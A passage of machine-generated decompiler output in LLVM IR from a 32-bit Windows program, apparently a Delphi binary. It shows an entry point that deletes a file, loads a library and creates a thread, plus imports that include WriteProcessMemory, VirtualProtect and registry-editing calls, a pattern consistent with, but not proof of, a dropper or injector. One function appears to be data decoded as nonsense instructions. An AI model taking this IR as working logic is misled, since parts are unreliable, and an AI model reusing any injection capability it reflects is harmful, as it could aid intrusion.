  %0 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a1c, i32 0, i32 0), i32 4225064), !insn.addr !2221
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2222
  %1 = call i32 @function_407660(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407a10, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a38, i32 0, i32 0), i32 4225140), !insn.addr !2223
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2224
  %2 = call i32 @function_407660(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a50, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a5c, i32 0, i32 0), i32 4225188), !insn.addr !2225
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2226
  ret i32 %2, !insn.addr !2227
}

define i32 @function_407a10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_407a10:
  %merge.reg2mem = alloca i32, !insn.addr !2228
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2228
  br i1 %10, label %dec_label_pc_407a3f, label %dec_label_pc_407a12, !insn.addr !2228

dec_label_pc_407a12:                              ; preds = %dec_label_pc_407a10
  br i1 %8, label %dec_label_pc_407a48, label %dec_label_pc_407a15, !insn.addr !2229

dec_label_pc_407a15:                              ; preds = %dec_label_pc_407a12
  %11 = trunc i32 %4 to i16, !insn.addr !2230
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2230
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2230
  store i8 %12, i8* %13, align 1, !insn.addr !2230
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2231
  store i8 %14, i8* %13, align 1, !insn.addr !2231
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2232
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2232
  %19 = add i8 %16, %18, !insn.addr !2232
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2232
  store i8 %19, i8* %20, align 1, !insn.addr !2232
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2233
  %21 = trunc i32 %arg10 to i16, !insn.addr !2234
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2234
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2234
  store i32 %22, i32* %23, align 4, !insn.addr !2234
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2235
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2236
  %25 = load i8, i8* %24, align 1, !insn.addr !2236
  %26 = trunc i32 %arg1 to i8, !insn.addr !2236
  %27 = add i8 %25, %26, !insn.addr !2236
  store i8 %27, i8* %24, align 1, !insn.addr !2236
  %28 = trunc i32 %arg3 to i16, !insn.addr !2237
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2237
  %30 = load i32, i32* %29, align 4, !insn.addr !2237
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2237
  %31 = add i32 %arg5, 67, !insn.addr !2238
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2238
  %34 = load i32, i32* %33, align 4, !insn.addr !2238
  %35 = load i8, i8* %24, align 1, !insn.addr !2239
  %36 = add i8 %35, %26, !insn.addr !2239
  store i8 %36, i8* %24, align 1, !insn.addr !2239
  %37 = mul i32 %34, 1557718248, !insn.addr !2240
  %38 = add i32 %arg7, 97, !insn.addr !2240
  %39 = add i32 %38, %37, !insn.addr !2240
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2240
  %41 = load i8, i8* %40, align 1, !insn.addr !2240
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2240
  %44 = add i8 %43, %41, !insn.addr !2240
  %45 = icmp eq i8 %44, 0, !insn.addr !2240
  store i8 %44, i8* %40, align 1, !insn.addr !2240
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2241
  br i1 %45, label %dec_label_pc_407ab1, label %dec_label_pc_407a3f, !insn.addr !2241

dec_label_pc_407a3f:                              ; preds = %dec_label_pc_407a10, %dec_label_pc_407a15
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2242

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a12
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2243
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2243
  store i8 %48, i8* %49, align 1, !insn.addr !2243
  %50 = add i32 %3, 104, !insn.addr !2244
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2244
  %52 = load i8, i8* %51, align 1, !insn.addr !2244
  %53 = udiv i32 %4, 256, !insn.addr !2244
  %54 = trunc i32 %53 to i8, !insn.addr !2244
  %55 = add i8 %52, %54, !insn.addr !2244
  store i8 %55, i8* %51, align 1, !insn.addr !2244
  %56 = trunc i32 %4 to i16, !insn.addr !2245
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2245
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2245
  store i8 %57, i8* %58, align 1, !insn.addr !2245
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2246
  store i8 %59, i8* %58, align 1, !insn.addr !2246
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2247
  store i8 %60, i8* %58, align 1, !insn.addr !2247
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2248
  store i8 %61, i8* %58, align 1, !insn.addr !2248
  %62 = load i8, i8* %51, align 1, !insn.addr !2249
  %63 = trunc i32 %4 to i8, !insn.addr !2249
  %64 = add i8 %62, %63, !insn.addr !2249
  store i8 %64, i8* %51, align 1, !insn.addr !2249
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2250
  store i8 %65, i8* %58, align 1, !insn.addr !2250
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2251
  store i8 %66, i8* %58, align 1, !insn.addr !2251
  %67 = add i32 %2, 1, !insn.addr !2252
  %68 = icmp slt i32 %67, 0, !insn.addr !2252
  br i1 %68, label %dec_label_pc_407ac9, label %dec_label_pc_407a64, !insn.addr !2253

dec_label_pc_407a64:                              ; preds = %dec_label_pc_407a48
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2254
  %72 = xor i32 %4, %1, !insn.addr !2255
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2256
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2256
  %76 = load i16, i16* %75, align 2, !insn.addr !2256
  %77 = trunc i32 %72 to i16, !insn.addr !2256
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2256
  %78 = load i8, i8* %73, align 4, !insn.addr !2257
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2257
  %81 = add i8 %78, %80, !insn.addr !2257
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2257
  store i8 %81, i8* %82, align 1, !insn.addr !2257
  %83 = add i32 %71, 82, !insn.addr !2258
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2258
  %85 = load i8, i8* %84, align 1, !insn.addr !2258
  %86 = add i8 %85, %63, !insn.addr !2258
  store i8 %86, i8* %84, align 1, !insn.addr !2258
  %87 = load i32, i32* %eax, align 4, !insn.addr !2259
  %88 = add i32 %87, -1, !insn.addr !2259
  %89 = add i32 %71, 4227341, !insn.addr !2260
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2260
  %91 = load i8, i8* %90, align 1, !insn.addr !2260
  %92 = udiv i32 %88, 256, !insn.addr !2260
  %93 = trunc i32 %92 to i8, !insn.addr !2260
  %94 = add i8 %91, %93, !insn.addr !2260
  store i8 %94, i8* %90, align 1, !insn.addr !2260
  ret i32 %88, !insn.addr !2260

dec_label_pc_407ab1:                              ; preds = %dec_label_pc_407a15
  %95 = add i32 %46, 1, !insn.addr !2261
  store i32 %95, i32* %eax, align 4, !insn.addr !2261
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2262
  %97 = load i8, i8* %96, align 1, !insn.addr !2262
  %98 = udiv i32 %arg3, 256, !insn.addr !2262
  %99 = trunc i32 %98 to i8, !insn.addr !2262
  %100 = add i8 %97, %99, !insn.addr !2262
  store i8 %100, i8* %96, align 1, !insn.addr !2262
  %101 = add i32 %arg3, 89, !insn.addr !2263
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2263
  store i8 -1, i8* %102, align 1, !insn.addr !2263
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2264
  %103 = load i32, i32* %eax, align 4, !insn.addr !2265
  ret i32 %103, !insn.addr !2265

dec_label_pc_407ac9:                              ; preds = %dec_label_pc_407a48
  %104 = load i32, i32* %eax, align 4, !insn.addr !2266
  ret i32 %104, !insn.addr !2266
}

define i32 @function_407acc() local_unnamed_addr {
dec_label_pc_407acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2267
  %2 = add i32 %1, -1, !insn.addr !2267
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2267
  ret i32 %0, !insn.addr !2268
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2269
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407aff:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2270
  ret i32 %0, !insn.addr !2270
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2271
}

define i32 @function_407b06(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b06:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2272
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407c00:
  %esp.2.reg2mem = alloca i32, !insn.addr !2273
  %esp.1.reg2mem = alloca i32, !insn.addr !2273
  %esp.0.reg2mem = alloca i32, !insn.addr !2273
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2274
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2275
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2275
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2275
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2276
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2277
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f8 to i8*), i32 0), !insn.addr !2278
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2279
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2279
  store i8 0, i8* %6, align 1, !insn.addr !2279
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2280
  %8 = call i32 @function_40708c(), !insn.addr !2281
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2282
  %10 = call i32 @function_407104(), !insn.addr !2283
  %11 = trunc i32 %10 to i8, !insn.addr !2284
  %12 = icmp eq i8 %11, 0, !insn.addr !2284
  br i1 %12, label %dec_label_pc_407d07, label %dec_label_pc_407c8c, !insn.addr !2285

dec_label_pc_407c8c:                              ; preds = %dec_label_pc_407c00
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2286
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2287
  store i32 -1, i32* %14, align 4, !insn.addr !2287
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2288
  %16 = call i32 @function_4070cc(), !insn.addr !2289
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2290
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2291
  %19 = call i32 @function_4036c8(), !insn.addr !2292
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2293
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2294
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2295
  %23 = call i32 @function_4036c8(), !insn.addr !2296
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2297
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2297
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2297
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2298
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2298
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2299
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2300
  br label %dec_label_pc_407d34, !insn.addr !2300

dec_label_pc_407d07:                              ; preds = %dec_label_pc_407c00
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2277
  %29 = call i32 @function_4060f0(), !insn.addr !2301
  %30 = call i32 @function_407104(), !insn.addr !2302
  %31 = trunc i32 %30 to i8, !insn.addr !2303
  %32 = icmp eq i8 %31, 0, !insn.addr !2303
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2304
  br i1 %32, label %dec_label_pc_407e76, label %dec_label_pc_407d29, !insn.addr !2304

dec_label_pc_407d29:                              ; preds = %dec_label_pc_407d07
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2305
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2306
  store i32 -1, i32* %34, align 4, !insn.addr !2306
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2306
  br label %dec_label_pc_407d34, !insn.addr !2306

dec_label_pc_407d34:                              ; preds = %dec_label_pc_407d29, %dec_label_pc_407c8c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2307
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2307
  store i32 260, i32* %36, align 4, !insn.addr !2307
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2308
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2308
  store i32 ptrtoint (i8** @global_var_4096f8 to i32), i32* %38, align 4, !insn.addr !2308
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2309
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2309
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2310
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2310
  store i32 %40, i32* %42, align 4, !insn.addr !2310
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2311
  %44 = add i32 %43, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2312
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2312
  store i8 0, i8* %45, align 1, !insn.addr !2312
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2313
  %47 = call i32 @function_4070cc(), !insn.addr !2314
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2315
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2316
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2317
  %51 = icmp eq i32 %50, 0, !insn.addr !2317
  br i1 %51, label %dec_label_pc_407dcd, label %dec_label_pc_407d9a, !insn.addr !2318

dec_label_pc_407d9a:                              ; preds = %dec_label_pc_407d34
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2319
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2319
  store i32 ptrtoint ([16 x i8]* @global_var_407ef8 to i32), i32* %53, align 4, !insn.addr !2319
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2320
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2320
  store i32 ptrtoint ([8 x i8]* @global_var_407f08 to i32), i32* %55, align 4, !insn.addr !2320
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2321
  %57 = icmp eq i32* %56, null, !insn.addr !2322
  %58 = icmp eq i1 %57, false, !insn.addr !2323
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2323
  br i1 %58, label %dec_label_pc_407e76, label %dec_label_pc_407db1, !insn.addr !2323

dec_label_pc_407db1:                              ; preds = %dec_label_pc_407d9a
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2324
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2324
  store i32 ptrtoint (i32* @global_var_409808 to i32), i32* %60, align 4, !insn.addr !2324
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2325
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2325
  store i32 0, i32* %62, align 4, !insn.addr !2325
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2326
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2326
  store i32 66, i32* %64, align 4, !insn.addr !2326
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2327
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2327
  store i32 4220780, i32* %66, align 4, !insn.addr !2327
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2328
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2328
  store i32 0, i32* %68, align 4, !insn.addr !2328
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2329
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2329
  store i32 0, i32* %70, align 4, !insn.addr !2329
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2330
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2331
  br label %dec_label_pc_407e76, !insn.addr !2331

dec_label_pc_407dcd:                              ; preds = %dec_label_pc_407d34
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2332
  %73 = icmp eq i32 %72, 0, !insn.addr !2332
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2333
  br i1 %73, label %dec_label_pc_407e76, label %dec_label_pc_407ddb, !insn.addr !2333

dec_label_pc_407ddb:                              ; preds = %dec_label_pc_407dcd
  %74 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2334
  %75 = icmp eq i8 %74, 0, !insn.addr !2334
  br i1 %75, label %dec_label_pc_407dea, label %dec_label_pc_407de5, !insn.addr !2335

dec_label_pc_407de5:                              ; preds = %dec_label_pc_407ddb
  %76 = call i32 @function_40692c(), !insn.addr !2336
  br label %dec_label_pc_407dea, !insn.addr !2336

dec_label_pc_407dea:                              ; preds = %dec_label_pc_407de5, %dec_label_pc_407ddb
  %77 = load i32, i32* @global_var_408148, align 4, !insn.addr !2337
  %78 = icmp slt i32 %77, 1, !insn.addr !2338
  br i1 %78, label %dec_label_pc_407e27, label %dec_label_pc_407df4, !insn.addr !2338

dec_label_pc_407df4:                              ; preds = %dec_label_pc_407dea
  %79 = call i32 @function_404d38(), !insn.addr !2339
  %80 = call i32 @"@LStrCmp"(), !insn.addr !2340
  %81 = load i32, i32* @global_var_408154, align 4, !insn.addr !2341
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2342
  store i32 -1, i32* %82, align 4, !insn.addr !2342
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2343
  %84 = icmp eq i32 %83, 0, !insn.addr !2343
  br i1 %84, label %dec_label_pc_407e27, label %dec_label_pc_407e22, !insn.addr !2344

dec_label_pc_407e22:                              ; preds = %dec_label_pc_407df4
  %85 = call i32 @function_40600c(), !insn.addr !2345
  br label %dec_label_pc_407e27, !insn.addr !2345

dec_label_pc_407e27:                              ; preds = %dec_label_pc_407e22, %dec_label_pc_407df4, %dec_label_pc_407dea
  %86 = add i32 %esp.0.reload, -16, !insn.addr !2346
  %87 = inttoptr i32 %86 to i32*, !insn.addr !2346
  store i32 3, i32* %87, align 4, !insn.addr !2346
  %88 = add i32 %esp.0.reload, -20, !insn.addr !2347
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2347
  store i32 16065, i32* %89, align 4, !insn.addr !2347
  %90 = load i32, i32* @global_var_408118, align 4, !insn.addr !2348
  %91 = add i32 %esp.0.reload, -24, !insn.addr !2349
  %92 = inttoptr i32 %91 to i32*, !insn.addr !2349
  store i32 %90, i32* %92, align 4, !insn.addr !2349
  %93 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2350
  %94 = icmp eq i32* %93, null, !insn.addr !2351
  %95 = icmp eq i1 %94, false, !insn.addr !2352
  store i32 %91, i32* %esp.1.reg2mem, !insn.addr !2352
  br i1 %95, label %dec_label_pc_407e67, label %dec_label_pc_407e3d, !insn.addr !2352

dec_label_pc_407e3d:                              ; preds = %dec_label_pc_407e27
  %96 = add i32 %esp.0.reload, -28, !insn.addr !2353
  %97 = inttoptr i32 %96 to i32*, !insn.addr !2353
  store i32 14, i32* %97, align 4, !insn.addr !2353
  %98 = add i32 %esp.0.reload, -32, !insn.addr !2354
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2354
  store i32 16065, i32* %99, align 4, !insn.addr !2354
  %100 = load i32, i32* @global_var_408118, align 4, !insn.addr !2355
  %101 = add i32 %esp.0.reload, -36, !insn.addr !2356
  %102 = inttoptr i32 %101 to i32*, !insn.addr !2356
  store i32 %100, i32* %102, align 4, !insn.addr !2356
  %103 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2357
  %104 = icmp eq i32* %103, null, !insn.addr !2358
  %105 = icmp eq i1 %104, false, !insn.addr !2359
  store i32 %101, i32* %esp.1.reg2mem, !insn.addr !2359
  br i1 %105, label %dec_label_pc_407e67, label %dec_label_pc_407e53, !insn.addr !2359

dec_label_pc_407e53:                              ; preds = %dec_label_pc_407e3d
  %106 = add i32 %esp.0.reload, -40, !insn.addr !2360
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2360
  store i32 16065, i32* %107, align 4, !insn.addr !2360
  %108 = load i32, i32* @global_var_408118, align 4, !insn.addr !2361
  %109 = add i32 %esp.0.reload, -44, !insn.addr !2362
  %110 = inttoptr i32 %109 to i32*, !insn.addr !2362
  store i32 %108, i32* %110, align 4, !insn.addr !2362
  %111 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2363
  %112 = icmp eq i32* %111, null, !insn.addr !2364
  store i32 %109, i32* %esp.1.reg2mem, !insn.addr !2365
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !2365
  br i1 %112, label %dec_label_pc_407e76, label %dec_label_pc_407e67, !insn.addr !2365

dec_label_pc_407e67:                              ; preds = %dec_label_pc_407e53, %dec_label_pc_407e3d, %dec_label_pc_407e27
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %113 = call i32 @function_4079a0(), !insn.addr !2366
  store i32 4225748, i32* @global_var_409654, align 4, !insn.addr !2367
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2367
  br label %dec_label_pc_407e76, !insn.addr !2367

dec_label_pc_407e76:                              ; preds = %dec_label_pc_407e67, %dec_label_pc_407e53, %dec_label_pc_407dcd, %dec_label_pc_407db1, %dec_label_pc_407d9a, %dec_label_pc_407d07
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %114 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2368
  %115 = load i32, i32* %114, align 4, !insn.addr !2368
  call void @__writefsdword(i32 0, i32 %115), !insn.addr !2369
  %116 = add i32 %esp.2.reload, 8, !insn.addr !2370
  %117 = inttoptr i32 %116 to i32*, !insn.addr !2370
  store i32 4226712, i32* %117, align 4, !insn.addr !2370
  %118 = call i32 @"@LStrArrayClr"(), !insn.addr !2371
  ret i32 %118, !insn.addr !2372
}

define i32 @function_407e91() local_unnamed_addr {
dec_label_pc_407e91:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2373
  ret i32 %0, !insn.addr !2373
}

define i32 @function_407e96() local_unnamed_addr {
dec_label_pc_407e96:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2374
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

